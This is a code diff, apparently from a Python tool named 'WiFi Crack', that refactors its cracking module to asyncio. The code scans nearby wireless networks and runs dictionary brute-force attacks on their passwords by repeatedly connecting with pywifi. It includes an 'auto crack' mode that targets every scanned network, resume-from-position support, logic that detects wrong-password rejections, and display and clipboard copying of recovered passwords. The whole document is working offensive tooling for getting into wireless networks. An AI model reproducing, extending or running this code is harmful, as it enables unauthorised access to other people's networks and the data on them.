@@ -1,8 +1,11 @@
 # -*- coding: utf-8 -*-
 """
-WiFi Crack - Core cracking functionality
+WiFi Crack - Async Core cracking functionality
+
+This module provides async versions of WiFi cracking operations,
+allowing non-blocking UI during long-running operations.
 """
-import time
+import asyncio
 import platform
 from itertools import islice
 from typing import TYPE_CHECKING, Optional, Dict, List, Union
@@ -13,17 +16,18 @@ from pywifi.iface import Interface
 
 from .constants import Colors, Messages, Defaults
 from .logger import get_logger
+from .async_runner import run_in_thread
 
 if TYPE_CHECKING:
     from .wifi_tool import WifiCrackTool
 
 
-class Crack:
-    """WiFi password cracking class"""
+class AsyncCrack:
+    """Async WiFi password cracking class"""
     
     def __init__(self, tool: 'WifiCrackTool'):
         """
-        Initialize Crack instance
+        Initialize AsyncCrack instance
         
         :param tool: WifiCrackTool instance
         """
@@ -47,6 +51,9 @@ class Crack:
         self.current_ssid: str = ""
         self.current_position: int = 0
         
+        # Cancellation flag
+        self._cancelled = False
+        
         # Initialize wireless adapter
         self._init_wnic()
     
@@ -56,15 +63,7 @@ class Crack:
                                  log_prefix: str = "[警告]", 
                                  color: str = Colors.ORANGE,
                                  reset: bool = True) -> None:
-        """
-        统一处理警告消息并可选地重置控件状态
-        
-        :param title: 对话框标题
-        :param message: 消息内容
-        :param log_prefix: 日志前缀
-        :param color: 消息颜色
-        :param reset: 是否重置控件状态
-        """
+        """统一处理警告消息并可选地重置控件状态"""
         self.win.show_warning.send(title, message)
         self.win.show_msg.send(f"{log_prefix}{message}\n\n", color)
         if reset:
@@ -73,14 +72,7 @@ class Crack:
     def _show_error_and_reset(self, title: str, message: str,
                                error: Optional[Exception] = None,
                                reset: bool = True) -> None:
-        """
-        统一处理错误消息并可选地重置控件状态
-        
-        :param title: 对话框标题
-        :param message: 消息内容
-        :param error: 异常对象
-        :param reset: 是否重置控件状态
-        """
+        """统一处理错误消息并可选地重置控件状态"""
         error_msg = f"{message} {error}" if error else message
         self.logger.error(error_msg)
         self.win.show_error.send(title, error_msg)
@@ -89,13 +81,16 @@ class Crack:
             self.win.reset_controls_state.send()
     
     def _show_status_msg(self, message: str, color: str = Colors.BLACK) -> None:
-        """
-        发送状态消息（不显示对话框）
-        
-        :param message: 消息内容
-        :param color: 消息颜色
-        """
+        """发送状态消息（不显示对话框）"""
         self.win.show_msg.send(message, color)
+    
+    def cancel(self) -> None:
+        """Cancel current operation"""
+        self._cancelled = True
+    
+    def reset_cancel(self) -> None:
+        """Reset cancellation flag"""
+        self._cancelled = False
     
     def _init_wnic(self) -> None:
         """Initialize wireless network adapter"""
@@ -118,8 +113,10 @@ class Crack:
             self.tool.show_msg(f"[错误]获取无线网卡时发生未知错误 {e}\n\n", Colors.RED)
             self.tool.reset_controls_state()
     
-    def search_wifi(self) -> None:
-        """Scan for nearby WiFi networks"""
+    # ==================== 异步扫描方法 ====================
+    
+    async def search_wifi(self) -> None:
+        """Async scan for nearby WiFi networks"""
         try:
             # Validate wireless adapter
             if not self.wnics or len(self.wnics) == 0:
@@ -134,9 +131,9 @@ class Crack:
             self.iface = self.wnics[wnic_index]
             name = self.iface.name()
             
-            # Check adapter status
+            # Check adapter status (run in thread as it may block)
             try:
-                iface_status = self.iface.status()
+                iface_status = await run_in_thread(self.iface.status)
                 self._show_status_msg(f"网卡状态: {iface_status}\n", Colors.BLUE)
                 
                 valid_statuses = [
@@ -158,9 +155,9 @@ class Crack:
                 )
                 return
             
-            # Start scanning
+            # Start scanning (run in thread)
             try:
-                self.iface.scan()
+                await run_in_thread(self.iface.scan)
                 self._show_status_msg(Messages.SCANNING_WIFI.format(name=name))
             except Exception as e:
                 self._show_warning_and_reset(
@@ -170,12 +167,12 @@ class Crack:
                 )
                 return
             
-            # Wait for scan
-            time.sleep(self.tool.config.scan_time)
+            # Wait for scan (async sleep - non-blocking!)
+            await asyncio.sleep(self.tool.config.scan_time)
             
-            # Get scan results
+            # Get scan results (run in thread)
             try:
-                ap_list = self.iface.scan_results()
+                ap_list = await run_in_thread(self.iface.scan_results)
                 
                 if ap_list is None:
                     self._show_warning_and_reset(
@@ -195,7 +192,7 @@ class Crack:
             
             ap_list = list(ap_dict_tmp.values())
             
-            self.win.show_msg.send(Messages.SCAN_COMPLETE, Colors.BLACK)
+            self._show_status_msg(Messages.SCAN_COMPLETE)
             
             # Build profile dictionary
             self.ssids = []
@@ -223,30 +220,31 @@ class Crack:
             error_msg = str(e)
             
             self.logger.error(f"扫描wifi时发生错误: {error_type}: {error_msg}")
-            self.win.show_msg.send(f"[调试]异常类型: {error_type}, 异常信息: {error_msg}\n", Colors.BLUE)
+            self._show_status_msg(f"[调试]异常类型: {error_type}, 异常信息: {error_msg}\n", Colors.BLUE)
             
             if "NULL pointer access" in error_msg or "NoneType" in error_msg or error_type == "OSError":
-                self.win.show_warning.send(
+                self._show_warning_and_reset(
                     '警告',
                     f'你当前设备的WLAN未打开或无线网卡不可用！\n\n详细信息: {error_type}: {error_msg}'
                 )
-                self.win.show_msg.send("[警告]你当前设备的WLAN未打开或无线网卡不可用！\n\n", Colors.ORANGE)
             else:
-                self.win.show_error.send('错误警告', f'扫描wifi时发生未知错误\n\n{error_type}: {error_msg}')
-                self.win.show_msg.send(f"[错误]扫描wifi时发生未知错误 ({error_type}): {error_msg}\n\n", Colors.RED)
+                self._show_error_and_reset('错误警告', f'扫描wifi时发生未知错误\n\n{error_type}: {error_msg}')
             
             self.win.reset_controls_state.send()
     
-    def auto_crack(self, start_position: int = 0) -> Optional[bool]:
+    # ==================== 异步破解方法 ====================
+    
+    async def auto_crack(self, start_position: int = 0) -> Optional[bool]:
         """
-        Auto crack all scanned WiFi networks
+        Async auto crack all scanned WiFi networks
         
         :param start_position: Resume position (-1 for unified resume handling)
         :return: False on error, None otherwise
         """
         try:
             self.is_auto = True
-            self.win.show_msg.send(Messages.AUTO_CRACK_START, Colors.BLUE)
+            self.reset_cancel()
+            self._show_status_msg(Messages.AUTO_CRACK_START, Colors.BLUE)
             
             # Get already cracked SSIDs
             cracked_ssids = [item['ssid'] for item in self.tool.config.pwd_dict_data]
@@ -269,6 +267,9 @@ class Crack:
             colors = {}
             
             for ssid in uncracked_ssids:
+                if self._cancelled:
+                    break
+                    
                 if start_position == -1:
                     # Use unified resume handling
                     resume_info = self.tool.config.resume_info
@@ -280,9 +281,9 @@ class Crack:
                         start_pos = resume_info[ssid]['position']
                     else:
                         start_pos = 0
-                    pwd = self.crack(ssid, start_pos)
+                    pwd = await self.crack(ssid, start_pos)
                 else:
-                    pwd = self._crack_single_wifi(ssid)
+                    pwd = await self._crack_single_wifi(ssid)
                 
                 if isinstance(pwd, str):
                     pwds[ssid] = pwd
@@ -297,8 +298,8 @@ class Crack:
             crack_result_info = "结果如下：\n"
             for i, ssid in enumerate(uncracked_ssids, 1):
                 crack_result_info += (
-                    f"<span style='color:{colors[ssid]}'>"
-                    f"{'&nbsp;' * 40}({i}){'&nbsp;' * 10}{ssid}{'&nbsp;' * 10}{pwds[ssid]}"
+                    f"<span style='color:{colors.get(ssid, Colors.RED)}'>"
+                    f"{'&nbsp;' * 40}({i}){'&nbsp;' * 10}{ssid}{'&nbsp;' * 10}{pwds.get(ssid, '未完成')}"
                     f"</span>\n"
                 )
             
@@ -308,14 +309,19 @@ class Crack:
             self.is_auto = False
             self.win.reset_controls_state.send()
             
+        except asyncio.CancelledError:
+            self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
+            self.is_auto = False
+            self.win.reset_controls_state.send()
+            return False
         except Exception as e:
             self._show_error_and_reset('错误警告', '自动破解过程中发生未知错误', e)
             self.is_auto = False
             return False
     
-    def _crack_single_wifi(self, ssid: str) -> Union[str, bool]:
+    async def _crack_single_wifi(self, ssid: str) -> Union[str, bool]:
         """
-        Crack single WiFi with resume support
+        Async crack single WiFi with resume support
         
         :param ssid: WiFi SSID
         :return: Password string on success, False on failure
@@ -329,11 +335,11 @@ class Crack:
             resume_info[ssid]['pwd_file'] == pwd_file):
             start_position = resume_info[ssid]['position']
         
-        return self.crack(ssid, start_position)
+        return await self.crack(ssid, start_position)
     
-    def crack(self, ssid: str, start_position: int = 0) -> Union[str, bool]:
+    async def crack(self, ssid: str, start_position: int = 0) -> Union[str, bool]:
         """
-        Crack WiFi password
+        Async crack WiFi password
         
         :param ssid: WiFi SSID
         :param start_position: Starting position for resume
@@ -341,6 +347,7 @@ class Crack:
         """
         try:
             self.current_ssid = ssid
+            self.reset_cancel()
             
             # Check password dictionary first
             pwd_dict_data = self.tool.config.pwd_dict_data
@@ -354,13 +361,13 @@ class Crack:
                     )
                     
                     for i, entry in enumerate(matching_entries, 1):
-                        if not self.tool.run:
+                        if not self.tool.run or self._cancelled:
                             self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
                             self.win.reset_controls_state.send()
                             return False
                         
                         pwd = entry['pwd']
-                        result = self._connect(ssid, pwd, 'json', i)
+                        result = await self._connect(ssid, pwd, 'json', i)
                         
                         if result and not self.is_auto:
                             self.win.show_info.send(
@@ -378,11 +385,12 @@ class Crack:
                     )
             
             # Disconnect current connection
-            self.iface.disconnect()
+            await run_in_thread(self.iface.disconnect)
             self._show_status_msg(Messages.DISCONNECTING)
-            time.sleep(1)
+            await asyncio.sleep(1)
             
-            if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
+            status = await run_in_thread(self.iface.status)
+            if status in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                 self._show_status_msg(Messages.DISCONNECT_SUCCESS)
             else:
                 self._show_status_msg(Messages.DISCONNECT_FAILED, Colors.RED)
@@ -411,14 +419,13 @@ class Crack:
                     current_position += 1
                     self.current_position = current_position
                     
-                    # Check pause
-                    with self.tool.crack_pause_condition:
-                        if self.tool.paused:
-                            self._show_status_msg(Messages.CRACK_PAUSED, Colors.ORANGE)
-                            self.tool.crack_pause_condition.wait()
+                    # Check pause (using async-friendly approach)
+                    while self.tool.paused and not self._cancelled:
+                        self._show_status_msg(Messages.CRACK_PAUSED, Colors.ORANGE)
+                        await asyncio.sleep(0.5)
                     
                     # Check stop
-                    if not self.tool.run:
+                    if not self.tool.run or self._cancelled:
                         self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
                         self.tool.config.save_resume_info(ssid, 'txt', pwd_path, current_position)
                         self.win.reset_controls_state.send()
@@ -426,7 +433,7 @@ class Crack:
                     
                     # 每N次检测WiFi是否仍然可用
                     if current_position % Defaults.WIFI_CHECK_INTERVAL == 0:
-                        if not self._check_wifi_available(ssid):
+                        if not await self._check_wifi_available(ssid):
                             self._show_status_msg(
                                 f"[警告] WiFi [{ssid}] 已不可用，停止破解并保存进度"
                                 f"（回退{Defaults.WIFI_UNAVAILABLE_ROLLBACK}次）\n\n",
@@ -439,7 +446,12 @@ class Crack:
                             return False
                     
                     pwd = line.strip()
-                    result = self._connect(ssid, pwd, 'txt', current_position)
+                    
+                    # Skip invalid passwords
+                    if len(pwd) < Defaults.MIN_PASSWORD_LENGTH or len(pwd) > Defaults.MAX_PASSWORD_LENGTH:
+                        continue
+                    
+                    result = await self._connect(ssid, pwd, 'txt', current_position)
                     
                     if result and not self.is_auto:
                         self.win.show_info.send('破解成功', f"连接成功，密码：{pwd}\n(已复制到剪切板)")
@@ -449,6 +461,10 @@ class Crack:
                     elif result:
                         self.tool.config.clear_resume_info(ssid)
                         return pwd
+                    
+                    # Yield control to event loop periodically
+                    if current_position % 5 == 0:
+                        await asyncio.sleep(0)
                 
                 if not self.is_auto:
                     self.win.show_info.send('破解失败', Messages.CRACK_COMPLETE)
@@ -457,13 +473,18 @@ class Crack:
             
             return False
             
+        except asyncio.CancelledError:
+            self._show_status_msg(Messages.CRACK_TERMINATED, Colors.RED)
+            self.tool.config.save_resume_info(ssid, 'txt', self.tool.config.pwd_txt_path, self.current_position)
+            self.win.reset_controls_state.send()
+            return False
         except Exception as e:
             self._show_error_and_reset('错误警告', '破解过程中发生未知错误', e)
             return False
     
-    def _check_wifi_available(self, ssid: str) -> bool:
+    async def _check_wifi_available(self, ssid: str) -> bool:
         """
-        Check if WiFi is still available by scanning
+        Async check if WiFi is still available by scanning
         
         :param ssid: WiFi SSID to check
         :return: True if WiFi is found, False otherwise
@@ -472,15 +493,15 @@ class Crack:
             self._show_status_msg(f"[检测] 正在检查WiFi [{ssid}] 是否可用...\n", Colors.BLUE)
             
             # 先断开连接以确保扫描结果是最新的
-            self.iface.disconnect()
-            time.sleep(Defaults.WIFI_DISCONNECT_WAIT)
+            await run_in_thread(self.iface.disconnect)
+            await asyncio.sleep(Defaults.WIFI_DISCONNECT_WAIT)
             
             # 进行多次扫描确认，避免因信号波动导致误判
             for scan_attempt in range(Defaults.WIFI_CHECK_RETRY_COUNT):
-                self.iface.scan()
-                time.sleep(Defaults.WIFI_SCAN_WAIT_TIME)
+                await run_in_thread(self.iface.scan)
+                await asyncio.sleep(Defaults.WIFI_SCAN_WAIT_TIME)
                 
-                ap_list = self.iface.scan_results()
+                ap_list = await run_in_thread(self.iface.scan_results)
                 
                 if ap_list is None:
                     if scan_attempt == 0:
@@ -498,7 +519,7 @@ class Crack:
                 elif scan_attempt == 0:
                     # 第一次没找到，进行二次扫描确认
                     self._show_status_msg(f"[检测] 第一次扫描未找到，进行二次确认...\n", Colors.ORANGE)
-                    time.sleep(Defaults.WIFI_SCAN_RETRY_WAIT)
+                    await asyncio.sleep(Defaults.WIFI_SCAN_RETRY_WAIT)
                     continue
             
             # 多次扫描都没找到
@@ -514,9 +535,9 @@ class Crack:
             # 出错时假设WiFi不可用，安全起见停止破解
             return False
     
-    def _connect(self, ssid: str, pwd: str, filetype: str, count: int) -> bool:
+    async def _connect(self, ssid: str, pwd: str, filetype: str, count: int) -> bool:
         """
-        Attempt to connect to WiFi
+        Async attempt to connect to WiFi
         
         :param ssid: WiFi SSID
         :param pwd: Password to try
@@ -525,7 +546,7 @@ class Crack:
         :return: True on successful connection
         """
         try:
-            self.iface.disconnect()
+            await run_in_thread(self.iface.disconnect)
             
             # Get security type
             akm_text = self.ui.cbo_security_type.currentText()
@@ -558,53 +579,50 @@ class Crack:
             
             profile.key = pwd
             
-            self.iface.remove_network_profile(profile)
-            temp_profile = self.iface.add_network_profile(profile)
+            await run_in_thread(self.iface.remove_network_profile, profile)
+            temp_profile = await run_in_thread(self.iface.add_network_profile, profile)
             
             # Try connection with smart failure detection
             max_retries = Defaults.MAX_RETRIES
             auth_fail_threshold = Defaults.AUTH_FAIL_THRESHOLD
             base_timeout = self.tool.config.connect_time
             
-            # 动态检测间隔（使用配置常量）
-            check_interval_fast = Defaults.CHECK_INTERVAL_FAST
-            check_interval_slow = Defaults.CHECK_INTERVAL_SLOW
-            
             for attempt in range(max_retries):
                 # 重试前确保完全断开
                 if attempt > 0:
-                    self.iface.disconnect()
-                    disconnect_wait_start = time.time()
-                    while time.time() - disconnect_wait_start < Defaults.DISCONNECT_WAIT_TIMEOUT:
-                        if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
+                    await run_in_thread(self.iface.disconnect)
+                    disconnect_start = asyncio.get_event_loop().time()
+                    while asyncio.get_event_loop().time() - disconnect_start < Defaults.DISCONNECT_WAIT_TIMEOUT:
+                        status = await run_in_thread(self.iface.status)
+                        if status in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                             break
-                        time.sleep(Defaults.DISCONNECT_CHECK_INTERVAL)
+                        await asyncio.sleep(Defaults.DISCONNECT_CHECK_INTERVAL)
                 
                 # 渐进式超时：第一次正常，第二次+1秒，第三次+2秒
                 extra_time = attempt  # 0, 1, 2
                 connect_timeout = base_timeout + extra_time
                 
                 if attempt > 0:
-                    self.win.show_msg.send(f"第{attempt + 1}次重试 (超时: {connect_timeout:.1f}s)...\n", Colors.BLUE)
+                    self._show_status_msg(f"第{attempt + 1}次重试 (超时: {connect_timeout:.1f}s)...\n", Colors.BLUE)
                 else:
-                    self.win.show_msg.send(f"正在进行第{count}次尝试...\n", Colors.BLACK)
+                    self._show_status_msg(f"正在进行第{count}次尝试...\n", Colors.BLACK)
                 
-                self.iface.connect(temp_profile)
+                await run_in_thread(self.iface.connect, temp_profile)
                 
-                connect_start_time = time.time()
+                connect_start_time = asyncio.get_event_loop().time()
                 was_connecting = False
                 connecting_start_time = None
                 failure_reason = None
                 
-                while time.time() - connect_start_time < connect_timeout:
+                while asyncio.get_event_loop().time() - connect_start_time < connect_timeout:
                     # 动态检测间隔：连接中时快速检测
-                    check_interval = check_interval_fast if was_connecting else check_interval_slow
-                    time.sleep(check_interval)
-                    status = self.iface.status()
+                    check_interval = Defaults.CHECK_INTERVAL_FAST if was_connecting else Defaults.CHECK_INTERVAL_SLOW
+                    await asyncio.sleep(check_interval)
+                    status = await run_in_thread(self.iface.status)
                     
                     # Success - connected!
                     if status == const.IFACE_CONNECTED:
-                        self.win.show_msg.send(
+                        self._show_status_msg(
                             Messages.CRACK_SUCCESS.format(pwd=pwd),
                             Colors.GREEN
                         )
@@ -619,25 +637,25 @@ class Crack:
                     if status == const.IFACE_CONNECTING:
                         if not was_connecting:
                             was_connecting = True
-                            connecting_start_time = time.time()
+                            connecting_start_time = asyncio.get_event_loop().time()
                     
                     # Early failure detection
                     if was_connecting and status in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
-                        connect_duration = time.time() - connecting_start_time if connecting_start_time else 0
+                        connect_duration = asyncio.get_event_loop().time() - connecting_start_time if connecting_start_time else 0
                         
                         if connect_duration < auth_fail_threshold:
                             # 快速失败 = 认证被拒绝 (密码错误) - 不需要重试
                             failure_reason = "auth_failed"
-                            self.win.show_msg.send(f"[快速拒绝] 密码错误 (耗时 {connect_duration:.2f}s)\n", Colors.RED)
+                            self._show_status_msg(f"[快速拒绝] 密码错误 (耗时 {connect_duration:.2f}s)\n", Colors.RED)
                         else:
                             # 慢速失败 = 可能是网络问题 - 需要重试
                             failure_reason = "network_issue"
-                            self.win.show_msg.send(f"[网络问题?] 连接中断 (耗时 {connect_duration:.2f}s)\n", Colors.ORANGE)
+                            self._show_status_msg(f"[网络问题?] 连接中断 (耗时 {connect_duration:.2f}s)\n", Colors.ORANGE)
                         break
                 else:
                     # 超时 - 可能是网络问题或密码正确但信号弱
                     failure_reason = "timeout"
-                    self.win.show_msg.send(f"[超时] 连接超时 ({connect_timeout:.1f}s)\n", Colors.ORANGE)
+                    self._show_status_msg(f"[超时] 连接超时 ({connect_timeout:.1f}s)\n", Colors.ORANGE)
                 
                 # 快速拒绝的不重试，直接判定密码错误
                 if failure_reason == "auth_failed":
@@ -645,14 +663,14 @@ class Crack:
                 
                 # 如果是网络问题或超时，用更长的超时重试
                 if failure_reason in ["network_issue", "timeout"] and attempt < max_retries - 1:
-                    self.win.show_msg.send(f"可能是网络问题，将用更长超时重试...\n", Colors.BLUE)
+                    self._show_status_msg(f"可能是网络问题，将用更长超时重试...\n", Colors.BLUE)
                     continue
                 
-                time.sleep(Defaults.POST_FAIL_WAIT)
+                await asyncio.sleep(Defaults.POST_FAIL_WAIT)
             
             # Connection failed
-            self.win.show_msg.send(Messages.CRACK_FAILED.format(pwd=pwd), Colors.RED)
-            self.iface.remove_network_profile(profile)
+            self._show_status_msg(Messages.CRACK_FAILED.format(pwd=pwd), Colors.RED)
+            await run_in_thread(self.iface.remove_network_profile, profile)
             return False
             
         except Exception as e:
